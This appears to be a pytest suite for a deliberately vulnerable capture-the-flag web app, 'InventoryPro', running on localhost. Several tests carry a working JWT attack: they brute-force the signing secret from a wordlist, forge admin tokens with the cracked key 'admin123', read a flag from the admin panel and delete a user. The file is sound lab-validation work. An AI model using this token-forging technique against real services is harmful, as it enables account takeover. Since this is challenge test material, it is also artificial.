import pytest
import requests
import jwt
import time
import base64
from datetime import datetime, timedelta

class TestInventoryProApp:
    base_url = "http://localhost:3206"
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test environment"""
        self.session = requests.Session()
        time.sleep(2)  # Wait for container to be ready
        
    def test_app_accessibility(self):
        """Test if the application is accessible"""
        response = self.session.get(self.base_url)
        assert response.status_code == 200
        assert "InventoryPro" in response.text
        
    def test_login_functionality(self):
        """Test login with valid credentials"""
        login_data = {
            "username": "manager",
            "password": "supply2024"
        }
        response = self.session.post(f"{self.base_url}/login", data=login_data)
        assert response.status_code == 200
        assert 'session' in self.session.cookies
        
    def test_dashboard_access(self):
        """Test dashboard access after login"""
        # Login first
        login_data = {
            "username": "manager", 
            "password": "supply2024"
        }
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        # Access dashboard
        response = self.session.get(f"{self.base_url}/dashboard")
        assert response.status_code == 200
        assert "Inventory Dashboard" in response.text
        assert "manager" in response.text
        
    def test_my_account_access(self):
        """Test my account page access"""
        # Login first
        login_data = {
            "username": "supervisor",
            "password": "inventory!"
        }
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        # Access account page
        response = self.session.get(f"{self.base_url}/my-account")
        assert response.status_code == 200
        assert "My Account" in response.text
        assert "supervisor" in response.text
        
    def test_admin_access_denied(self):
        """Test admin access is denied for non-admin users"""
        # Login as manager
        login_data = {
            "username": "manager",
            "password": "supply2024"
        }
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        # Try to access admin panel
        response = self.session.get(f"{self.base_url}/admin")
        assert response.status_code == 403
        
    def test_jwt_weak_secret_vulnerability(self):
        """Test JWT weak secret vulnerability exploitation"""
        # Login to get a valid JWT
        login_data = {
            "username": "manager",
            "password": "supply2024"
        }
        self.session.post(f"{self.base_url}/login", data=login_data)
        
        # Extract JWT token
        jwt_token = self.session.cookies.get('session')
        assert jwt_token is not None
        
        # Decode without verification to get structure
        decoded_payload = jwt.decode(jwt_token, options={"verify_signature": False})
        assert decoded_payload['sub'] == 'manager'
        
        # Create forged token with admin access
        # Using the weak secret "admin123"
        forged_payload = decoded_payload.copy()
        forged_payload['sub'] = 'admin'
        forged_payload['role'] = 'admin'
        forged_payload['exp'] = int((datetime.utcnow() + timedelta(hours=1)).timestamp())
        
        # Sign with weak secret
        weak_secret = "admin123"
        forged_token = jwt.encode(forged_payload, weak_secret, algorithm="HS256")
        
        # Use forged token to access admin panel
        admin_session = requests.Session()
        admin_session.cookies.set('session', forged_token)
        
        response = admin_session.get(f"{self.base_url}/admin")
        assert response.status_code == 200
        assert "Admin Panel" in response.text
        assert "Critical Assets" in response.text
        
    def test_flag_extraction(self):
        """Test flag extraction from admin panel"""
        # Create forged admin token
        payload = {
            "iss": "inventorymanager",
            "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
            "sub": "admin",
            "role": "admin",
            "kid": "test-kid"
        }
        
        weak_secret = "admin123"
        forged_token = jwt.encode(payload, weak_secret, algorithm="HS256")
        
        # Access admin panel with forged token
        admin_session = requests.Session()
        admin_session.cookies.set('session', forged_token)
        
        response = admin_session.get(f"{self.base_url}/admin")
        assert response.status_code == 200
        
        # Check for flag in response
        response_text = response.text
        assert "CYBER{" in response_text
        assert "JWT_w34k_s1gn1ng_k3y_cr4ck3d" in response_text or "adm1n_4cc3ss_gr4nt3d" in response_text
        
    def test_user_deletion_functionality(self):
        """Test user deletion functionality in admin panel"""
        # Create forged admin token
        payload = {
            "iss": "inventorymanager", 
            "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
            "sub": "admin",
            "role": "admin",
            "kid": "test-kid"
        }
        
        weak_secret = "admin123"
        forged_token = jwt.encode(payload, weak_secret, algorithm="HS256")
        
        # Test user deletion endpoint
        admin_session = requests.Session()
        admin_session.cookies.set('session', forged_token)
        
        response = admin_session.get(f"{self.base_url}/admin/delete?username=manager")
        assert response.status_code == 200
        
        response_json = response.json()
        assert "success" in response_json
        assert "manager" in response_json["success"]
        
    def test_hashcat_simulation(self):
        """Simulate hashcat cracking of JWT secret"""
        # Get a valid JWT token
        login_data = {
            "username": "manager",
            "password": "supply2024"
        }
        session = requests.Session()
        session.post(f"{self.base_url}/login", data=login_data)
        jwt_token = session.cookies.get('session')
        
        # Common weak secrets wordlist
        weak_secrets = [
            "secret", "password", "123456", "admin", "test", 
            "secret1", "admin123", "password123", "test123"
        ]
        
        # Try to crack the secret
        cracked_secret = None
        for secret in weak_secrets:
            try:
                jwt.decode(jwt_token, secret, algorithms=["HS256"])
                cracked_secret = secret
                break
            except jwt.InvalidSignatureError:
                continue
        
        assert cracked_secret == "admin123"
        print(f"JWT secret cracked: {cracked_secret}")
        
    def test_base64_encoding_secret(self):
        """Test Base64 encoding of cracked secret for JWT Editor"""
        secret = "admin123"
        encoded_secret = base64.b64encode(secret.encode()).decode()
        
        # Verify the encoding
        assert encoded_secret == "YWRtaW4xMjM="
        
        # Test JWK format structure
        jwk_format = {
            "kty": "oct",
            "kid": "test-key-id",
            "k": encoded_secret
        }
        
        assert jwk_format["k"] == "YWRtaW4xMjM="
        assert jwk_format["kty"] == "oct"
